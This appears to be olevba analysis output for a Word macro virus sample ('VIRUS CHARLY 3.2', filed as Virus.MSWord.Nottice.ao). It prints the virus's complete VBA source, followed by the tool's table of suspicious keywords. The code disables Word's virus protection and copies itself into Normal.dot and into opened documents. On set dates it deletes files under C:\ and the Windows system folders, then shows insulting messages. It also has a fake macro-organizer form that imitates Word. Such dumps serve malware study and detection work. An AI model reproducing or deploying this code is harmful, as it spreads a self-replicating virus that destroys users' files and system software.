olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Nottice.ao
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Nottice.ao - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Nottice.ao - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'VIRUS CHARLY  Ver 3.2 Copyright  Lima - Perú 1998. Actualizado el 31 de Mayo 1999
'Fué creado el 1 de Dic. de 1998 por CharlySoft. Está protegido por las leyes del
'derecho de autor; cualquier intento de copia sera sancionada drásticamente.
' --------->        Je Je Je...      Carlos Javier T.A.
Sub Main()
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Dim Cjt$: On Error GoTo -1: On Error GoTo SALIDA
WordBasic.DisableAutoMacros 0
Cjt$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If Cjt$ = "normal.dot" Then
   If INFECTA_D = 1 Then
      GoTo SALIDA
   Else
      InfectaDOC
   End If
Else
   If INFECTA_G = 1 Then
      GoTo SALIDA
   Else
      InfectaGlobal
   End If
End If
SALIDA:
WordBasic.Call "CHARLY_32"
End Sub
Sub HerramMacro()
    CharlyForm.Show
End Sub
Sub ViewVBCode()
    
End Sub
Private Function INFECTA_D()
Dim i
INFECTA_D = 0
If WordBasic.CountMacros(1) > 0 Then
   For i = 1 To WordBasic.CountMacros(1)
     If WordBasic.[MacroName$](i, 1) = "CHARLY_32" Then INFECTA_D = 1
   Next i
End If
End Function
Private Function INFECTA_G()
Dim i
INFECTA_G = 0
If WordBasic.CountMacros(0) > 0 Then
   For i = 1 To WordBasic.CountMacros(0)
     If WordBasic.[MacroName$](i, 0) = "CHARLY_32" Then INFECTA_G = 1
   Next i
End If
End Function
Private Sub InfectaDOC()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:CHARLY_32", WordBasic.[FileName$]() + ":CHARLY_32"
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="CharlyForm", Object:=wdOrganizerObjectProjectItems
WordBasic.FileSaveAll 1, 1
End Sub
Private Sub InfectaGlobal()
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":CHARLY_32", "Global:CHARLY_32"
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="CharlyForm", Object:=wdOrganizerObjectProjectItems
WordBasic.FileSaveAll 1, 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO CHARLY_32.bas 
in file: ./Virus.MSWord.Nottice.ao - OLE stream: 'Macros/VBA/CHARLY_32'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim Texto As String
Public Sub Main()
Attribute Main.VB_Description = "Macro creada el 01/12/98 por mi%\r\n"
Attribute Main.VB_ProcData.VB_Invoke_Func = "Project.CHARLYTO.MAIN"
Set Wb = WordBasic: WkDia = WordBasic.WeekDay(WordBasic.Now()): Dia = WordBasic.Day(WordBasic.Now()): MES = WordBasic.Month(WordBasic.Now())
If (Dia = 19 Or Dia = 23) And MES = 5 Then
 If Dia = 23 Then
   Texto = "FELIZ CUMPLEAÑOS CHARLY": FORMATO
   Wb.Insert "CHARLY Cumple " + Str(Wb.Year(Wb.Now()) - 1978) + " Hoy"
   Wb.InsertPara: Wb.InsertPara
   Wb.Insert "***Lima - Perú (VIRUS CHARLY)***": EMAIL
 Else
   Texto = "FELICIDADES POR TU CUMPLEAÑOS MINI": FORMATO
   Wb.Insert "En Homenaje a mi Querida Hermanita.   "
   Wb.FormatFont Points:="24", Color:=2: Wb.Insert ": "
   Wb.FormatFont Points:="18", Color:=6: Wb.Insert ")"
   Wb.InsertPara: Wb.InsertPara
   Wb.Insert "***Lima - Perú (VIRUS CHARLY)***": EMAIL
 End If
   KILLER
INFINITO:    'Tasks.ExitWindows
   GoTo INFINITO
End If       '***FECHAS ESPECIALES***
If Dia = 4 Or Dia = 11 Or (Dia = 13 And WkDia = 6) Or Dia = 31 Or (Dia = 17 And MES = 3) Or (Dia = 25 And MES = 12) Then
   If Dia = 17 Then
      Texto = "Maldita Cecilia; Arruinastes mi Vida...": FORMATO
   ElseIf Dia = 25 Then
      Texto = "FELIZ NAVIDAD .... Je Je Je": FORMATO
      Wb.Insert "Les Desea C.J.T.A."
   End If
   Texto = " ***Lima - Perú (VIRUS CHARLY)***": FORMATO
   EMAIL
   KILLER
GoTo INFINITO
End If
End Sub
Private Function KILLER() '***Elimina archivos***
On Error Resume Next: Kill "C:\*.*"
On Error Resume Next: Kill "C:\Windows\*.exe"
On Error Resume Next: Kill "C:\Windows\Command\*.*"
On Error Resume Next: Kill "C:\Windows\System\*.*"
If ActiveDocument.Saved = False Then ActiveDocument.Save
MATADOR
End Function
Private Sub FORMATO()
WordBasic.EditSelectAll: Selection.Delete
WordBasic.ToggleFull: WordBasic.Font "Busorama MD BT": WordBasic.FontSize 20
WordBasic.CenterPara: WordBasic.Insert Texto: WordBasic.StartOfLine: WordBasic.CharRight 1, 1
WordBasic.Bold: WordBasic.FormatFont Points:="28", Color:=2: WordBasic.EndOfLine
WordBasic.InsertPara: WordBasic.InsertPara: WordBasic.FormatFont Points:="18", Color:=6
End Sub
Private Sub EMAIL()
WordBasic.InsertPara: WordBasic.InsertPara
WordBasic.Font "Comic Sans MS": WordBasic.CenterPara: WordBasic.Bold
WordBasic.FormatFont Points:="11", Color:=2: WordBasic.Insert "Charly_Ter@Hotmail.com"
End Sub
Private Function MATADOR()
Msg = MsgBox("Maldito, Quieres Que Borre Tu Porquería de Archivos?", 4 + 16 + 4096, "VIRUS CHARLY     versión 3.2     ===>   IDAT")
If Msg = 6 Then
   Msg = MsgBox("Por Idiota Se Borraron Tus Archivos De Sistema", 0 + 64, "VIRUS CHARLY  versión 3.2  Charly_Ter@hotmail.com")
Else
   Msg = MsgBox("Mala Elección, Perdistes Tus Archivos De Sistema", 0 + 64, "VIRUS CHARLY  versión 3.2   Charly_Ter@hotmail.com")
End If
End Function

-------------------------------------------------------------------------------
VBA MACRO CharlyForm.frm 
in file: ./Virus.MSWord.Nottice.ao - OLE stream: 'Macros/VBA/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 















Private Sub ComboBox1_Click()
TextBox1.SetFocus
End Sub

Private Sub ComboBox1_Change()

End Sub

Private Sub CommandButton1_Click()

End Sub

Private Sub CommandButton2_Click()
End
End Sub
Private Sub CommandButton5_Click()
M = MsgBox("El nombre del elemento del proyecto no es válido.", 48 + 0, "MicroSoft Word")
End Sub
Private Sub CommandButton7_Click()
M = MsgBox("Opción desabilitada temporalmente", 48 + 0, "Advertencia de MS Word")
End Sub

Private Sub ListBox2_Click()

End Sub

Private Sub TextBox1_Change()

End Sub

Private Sub UserForm_Activate()
CommandButton1.Enabled = False
CommandButton3.Enabled = False
CommandButton4.Enabled = False
CommandButton6.Enabled = False
ComboBox1.AddItem "Todas las plantillas y documentos activos"
ComboBox1.AddItem "Normal.dot(plantilla global)"
ComboBox1.AddItem "Comandos de Word"
ComboBox1.AddItem "Documento1 (Documento)"
ComboBox1.ListIndex = 0
TextBox2.Text = "Macro creada el " + Str(Date) + " por " + Application.UserName
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Nombre de la macro :�

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Macros en:C
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Descripci�n:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ejecutar�

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancelar�

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Paso a Paso
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Modificar�C
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Crear
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Eliminar�

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organizador...I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN './Virus.MSWord.Nottice.ao' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |ComboBox1_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |ComboBox1_Change    |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

